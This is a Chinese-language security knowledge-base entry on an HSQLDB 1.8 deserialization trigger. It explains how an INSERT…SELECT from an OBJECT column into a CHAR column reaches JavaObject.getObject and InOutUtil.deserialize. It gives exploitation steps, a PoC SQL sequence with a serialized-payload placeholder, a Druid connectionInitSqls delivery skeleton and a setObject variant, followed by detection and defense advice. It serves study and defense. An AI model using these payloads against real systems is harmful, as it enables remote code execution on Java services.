---
id: web-java-component-hsqldb-javaobject-object-column-deserialization
title: HSQLDB 1.8 JavaObject/OBJECT 列反序列化：INSERT…SELECT 类型转换触发 Column.convertObject 与 InOutUtil.deserialize
type: scenario
domain: web
path: web/java/component
technique: hsqldb-javaobject-object-column-deserialization
tags:
- java
- hsqldb
- deserialization
- jdbc
- javaobject
- object-column
- druid
- connectioninitsqls
cve: []
affected_versions: hsqldb 1.8
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V362
  verified_at: '2026-11-09T03:00:17+08:00'
  notes: 已对照原文与调用图 01.png 核对：JavaObject.getObject→InOutUtil.deserialize→readObject、Column.convertObject 由 executeInsertSelectStatement/jdbcPreparedStatement.setParameter/jdbcResultSet.getObject/Function.getArguments 触发，与卡内原理/步骤一致；两条触发路径（INSERT…SELECT 类型转换、setObject 直传）与原文代码一致；affected_versions 已按原文标题/pom 归一为 hsqldb 1.8。未验证点：原文无执行截图/完整跑通栈（作者自述未写栈），卡内 confidence=medium 已如实标注；方法二依赖调用方传入 JavaObject 实例，作为独立入口的实际可利用性未验证。
url: /docs/web/java/component/web-java-component-hsqldb-javaobject-object-column-deserialization/
draft: false
kb_aliases:
- HSQLDB 反序列化
- JavaObject.getObject
- OBJECT 列反序列化
- INSERT SELECT 触发反序列化
- hsqldb 1.8 deserialization
- connectionInitSqls HSQLDB
---

## 一句话结论

HSQLDB 1.8 的 `JavaObject` 持有序列化字节，`getObject()` 会调用 `InOutUtil.deserialize(this.data)` 做原生 Java 反序列化；当表里存在 OBJECT 类型列并把它 `INSERT ... SELECT` 到另一种类型的列（或把 OBJECT 值转成字符串等）时，`Column.convertObject` 会取出 `JavaObject` 并触发反序列化，因此攻击者只要能控制 HSQLDB 连接上的初始化 SQL（如 Druid 的 `connectionInitSqls`），用纯 SQL 语句即可在目标 JVM 内触发反序列化链。

## 原理

- HSQLDB 1.8 用 `org.hsqldb.types.JavaObject` 表示 OBJECT 类型的值，内部保存序列化字节数组；其 `getObject()` 实现调用 `InOutUtil.deserialize(this.data)`，后者用 `ObjectInputStream.readObject()` 还原对象——这是框架自带的 Java 原生反序列化入口。
- 触发点不在连接建立本身，而在 SQL 值的类型转换：案例中 `test_1.data` 为 OBJECT 列（存入的是序列化字节的十六进制字符串），`test_2.data` 为 CHAR 列，执行 `INSERT INTO test_2 (name,data) SELECT name,data FROM test_1` 时走 `CompiledStatementExecutor.executeInsertSelectStatement`，对源列值做类型转换时调用 `Column.convertObject(Object o, int type)`，进而 `JavaObject.getObject()` → `InOutUtil.deserialize(byte[])` → `readObject()`。
- 完整调用面还包括 `jdbcResultSet.getObject(int columnIndex)`、`jdbcPreparedStatement.setParameter(int, Object)`/`setObject(int, Object)`、`Function.getArguments(Session session)` 等：只要是 HSQLDB 把 OBJECT 值取出来做转换/参数绑定的位置，都可能落到同一个 `getObject()`。
- 第二条路径是把 `JavaObject` 直接作为参数传给 `PreparedStatement.setObject`：`connection.prepareStatement("INSERT INTO test (name) VALUES (?)").setObject(1, new JavaObject(bytes))` 可在参数绑定时触发反序列化。但这条路径要求调用方主动传入 `JavaObject` 实例，且 `JavaObject` 本身不实现序列化接口，无法嵌进外层反序列化链，因此主要用于“已能执行 Java 代码/控制参数”的场景。
- 与 HSQLDB `CALL` 静态方法不同：本触发点不依赖反射调用任意静态方法，也不依赖额外 sink 类（如 `SerializationUtils`），反序列化由 HSQLDB 自身在 SQL 执行/类型转换过程中完成；它更适合作为“JDBC URL/初始化 SQL 可控”类漏洞的 payload 落点——外层用 Druid 等连接池的 getter（`getConnection`）建立连接并执行 `connectionInitSqls`，即可把反序列化链接入。

## 触发条件

- classpath 存在 HSQLDB 1.8 驱动（案例 1.8.0.10），连接指向 HSQLDB（内存或文件模式，如 `jdbc:hsqldb:mem:mydb`）。
- 攻击者可控制连接初始化 SQL 或能对 HSQLDB 执行自定义 SQL（Druid `connectionInitSqls`、JDBC URL 参数、数据源配置注入等）。
- 需要能建表、插入与查询（默认 `sa` 空口令连接通常具备该权限）。
- 若要形成完整 RCE，还需一个可用的原生反序列化 gadget 作为 OBJECT 列中的 payload（案例用自定义 `readObject` 执行 `Runtime.exec("calc")` 演示）。

## 利用步骤

1. 准备序列化 payload：构造实现 `Serializable`、在 `readObject(ObjectInputStream)` 中执行任意代码的类（或用现成 gadget 链），序列化后转十六进制字符串备用。
2. 在 HSQLDB 中建 OBJECT 列的表并写入 payload 的十六进制：
   `CREATE TABLE test_1 (id INTEGER IDENTITY, name VARCHAR(255), data OBJECT)`；
   `INSERT INTO test_1 (name, data) VALUES ('Alice', '<payload hex>')`。
3. 建另一张目标类型不同的表（如 CHAR），执行跨表插入触发类型转换：
   `CREATE TABLE test_2 (id INTEGER IDENTITY, name VARCHAR(255), data CHAR)`；
   `INSERT INTO test_2 (name, data) SELECT name, data FROM test_1`。
4. 把上述 SQL 按顺序放进连接初始化语句（如 Druid `connectionInitSqls`），让 `driverClass=org.hsqldb.jdbcDriver`、`jdbcUrl=jdbc:hsqldb:mem:mydb`，调用 `getConnection()`；连接初始化时依次执行，最后一步触发反序列化。
5. 若在反序列化链中利用，把“可控 JDBC URL + connectionInitSqls 的 DataSource”作为 getter 链的落点（如 `DruidDataSource.getConnection`），由外层反序列化触发连接与初始化 SQL。

## PoC

触发反序列化的最小 SQL 序列：

```sql
CREATE TABLE test_1 (id INTEGER IDENTITY, name VARCHAR(255), data OBJECT);
INSERT INTO test_1 (name, data) VALUES ('Alice', 'ACED00057372...');
CREATE TABLE test_2 (id INTEGER IDENTITY, name VARCHAR(255), data CHAR);
INSERT INTO test_2 (name, data) SELECT name, data FROM test_1;
```

Druid 连接池投递骨架（初始化连接时执行 SQL）：

```java
DruidDataSource ds = new DruidDataSource();
// 通过反射设置父类字段 jdbcUrl / driverClass / connectionInitSqls
setField(ds, "jdbcUrl", "jdbc:hsqldb:mem:mydb");
setField(ds, "driverClass", "org.hsqldb.jdbcDriver");
List<String> sqls = new ArrayList<>();
sqls.add("CREATE TABLE test_1 (id INTEGER IDENTITY, name VARCHAR(255), data OBJECT)");
sqls.add("INSERT INTO test_1 (name, data) VALUES ('Alice', '<payload hex>')");
sqls.add("CREATE TABLE test_2 (id INTEGER IDENTITY, name VARCHAR(255), data CHAR)");
sqls.add("INSERT INTO test_2 (name, data) SELECT name, data FROM test_1");
setField(ds, "connectionInitSqls", sqls);
ds.getConnection();   // 连接初始化 -> 最后一条 SQL 触发反序列化
```

setObject 直传变体：

```java
JavaObject javaObject = new JavaObject(serializedBytes);
connection.prepareStatement("INSERT INTO test (name) VALUES (?)")
          .setObject(1, javaObject);
```

## 变体与关联

- 变体：任何把 OBJECT 列值转为其它类型/字符串的 SQL（SELECT 到结果集后 `getObject`、函数参数绑定）都可能触发同一 `JavaObject.getObject()`。
- 变体：`setObject(JavaObject)` 直传路径适合已有代码执行入口时手工触发；因为 `JavaObject` 不实现序列化接口，不能嵌入外层序列化链。
- 关联：[[web-java-component-hsqldb-call-static-method-rce]]（HSQLDB `CALL` 任意静态方法 + c3p0/Spring 二次反序列化；不同 sink，可在同一 JDBC 投递链中相互替代）。
- 关联：[[web-java-deserialization-immutablesetmultimap-usingtostring-jsonarray-hsql]]（DruidXADataSource + HSQL `CALL` 二次反序列化的完整链示例）。
- 边界：案例仅在 HSQLDB 1.8.0.10 验证；现代 HSQLDB 2.x 的类型系统与 JavaObject 行为未在原文测试，不能直接套用。需要先能控制 SQL/初始化语句，单独的 OBJECT 列数据不构成远程入口。

## 检测与防御

- 禁止把用户输入拼进 JDBC URL、`connectionInitSqls` 或数据源配置；驱动/URL 方案使用白名单（禁止请求侧指定 `jdbc:hsqldb:*`）。
- HSQLDB 升级到受支持版本；避免业务表使用 OBJECT 类型存储外部数据，更不要对不可信字节做 `InOutUtil.deserialize` 式反序列化。
- 在 JVM 层启用 Java 序列化过滤器（JEP 290，`jdk.serialFilter`）或使用序列化白名单，阻断 gadget 类。
- 检测：应用日志/数据库日志中出现 `CREATE TABLE ... OBJECT` 后紧接跨表 `INSERT ... SELECT`、`JavaObject`/`InOutUtil.deserialize` 调用栈、连接初始化 SQL 中包含建表与十六进制字面量；对 Druid 等连接池配置的运行时改动做审计。
- 对反序列化入口做统一封装，拒绝来自数据库字段的序列化对象直接还原为 Java 对象。
